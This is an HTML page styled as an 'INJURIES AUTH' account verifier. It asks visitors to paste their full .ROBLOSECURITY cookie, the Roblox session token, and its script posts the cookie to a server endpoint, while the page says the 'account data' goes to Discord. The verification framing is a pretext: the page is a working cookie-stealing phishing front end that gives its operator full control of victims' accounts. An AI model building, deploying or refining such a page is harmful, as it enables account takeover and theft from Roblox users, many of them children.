<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>INJURIES AUTH</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0f0f0f;
      font-family: 'Segoe UI', 'Roboto', 'Inter', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 2rem;
    }

    .container {
      background: #1a1a1a;
      border-radius: 24px;
      padding: 2.5rem;
      width: 100%;
      max-width: 550px;
      box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.5);
      border: 1px solid #2a2a2a;
      transition: all 0.2s ease;
    }

    h1 {
      font-size: 2rem;
      font-weight: 700;
      letter-spacing: -0.5px;
      background: linear-gradient(135deg, #fff 0%, #ff0040 100%);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin-bottom: 0.5rem;
    }

    .subtitle {
      color: #aaa;
      font-size: 0.85rem;
      margin-bottom: 2rem;
      border-left: 3px solid #ff0040;
      padding-left: 12px;
    }

    .input-group {
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      color: #ddd;
      font-size: 0.9rem;
      margin-bottom: 8px;
      font-weight: 500;
    }

    textarea {
      width: 100%;
      background: #0a0a0a;
      border: 1px solid #2c2c2c;
      border-radius: 12px;
      padding: 12px 16px;
      color: #eee;
      font-family: 'Monaco', monospace;
      font-size: 0.85rem;
      resize: vertical;
      transition: all 0.2s;
    }

    textarea:focus {
      outline: none;
      border-color: #ff0040;
      box-shadow: 0 0 0 2px rgba(255, 0, 64, 0.2);
    }

    button {
      background: #ff0040;
      border: none;
      border-radius: 40px;
      padding: 12px 24px;
      width: 100%;
      font-size: 1rem;
      font-weight: 600;
      color: white;
      cursor: pointer;
      transition: all 0.2s ease;
      margin-top: 8px;
      letter-spacing: 0.5px;
    }

    button:hover {
      background: #cc0033;
      transform: translateY(-1px);
      box-shadow: 0 5px 15px rgba(255, 0, 64, 0.3);
    }

    button:active {
      transform: translateY(0);
    }

    .status {
      margin-top: 1.5rem;
      padding: 12px;
      border-radius: 12px;
      font-size: 0.9rem;
      text-align: center;
      background: #0f0f0f;
      border-left: 3px solid #ff0040;
      color: #ccc;
      word-break: break-word;
    }

    .status.error {
      border-left-color: #ff4444;
      color: #ff8888;
    }

    .status.success {
      border-left-color: #44ff44;
      color: #88ff88;
    }

    footer {
      margin-top: 2rem;
      text-align: center;
      font-size: 0.7rem;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>INJURIES AUTH</h1>
    <div class="subtitle">Enter .ROBLOSECURITY cookie to verify account</div>

    <div class="input-group">
      <label>Cookie (full .ROBLOSECURITY=...)</label>
      <textarea rows="3" id="cookieInput" placeholder=".ROBLOSECURITY=_|WARNING…"></textarea>
    </div>

    <button id="verifyBtn">VERIFY ACCOUNT</button>

    <div id="statusMessage" class="status">Ready — enter cookie and click verify.</div>
    <footer>Data will be sent to Discord securely.</footer>
  </div>

  <script>
    const verifyBtn = document.getElementById('verifyBtn');
    const cookieInput = document.getElementById('cookieInput');
    const statusDiv = document.getElementById('statusMessage');

    verifyBtn.addEventListener('click', async () => {
      const cookie = cookieInput.value.trim();
      if (!cookie) {
        setStatus('Please enter a .ROBLOSECURITY cookie.', 'error');
        return;
      }
      if (!cookie.startsWith('.ROBLOSECURITY=')) {
        setStatus('Cookie must start with ".ROBLOSECURITY="', 'error');
        return;
      }

      setStatus('Processing... please wait.', '');
      verifyBtn.disabled = true;
      verifyBtn.style.opacity = '0.6';

      try {
        const response = await fetch('/api/check', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookie })
        });

        const data = await response.json();

        if (!response.ok) {
          throw new Error(data.error || 'Server error');
        }

        setStatus('✅ Success! Account data has been sent to Discord.', 'success');
      } catch (err) {
        setStatus(`❌ Error: ${err.message}`, 'error');
      } finally {
        verifyBtn.disabled = false;
        verifyBtn.style.opacity = '1';
      }
    });

    function setStatus(message, type) {
      statusDiv.textContent = message;
      statusDiv.className = 'status';
      if (type) statusDiv.classList.add(type);
    }
  </script>
</body>
</html>
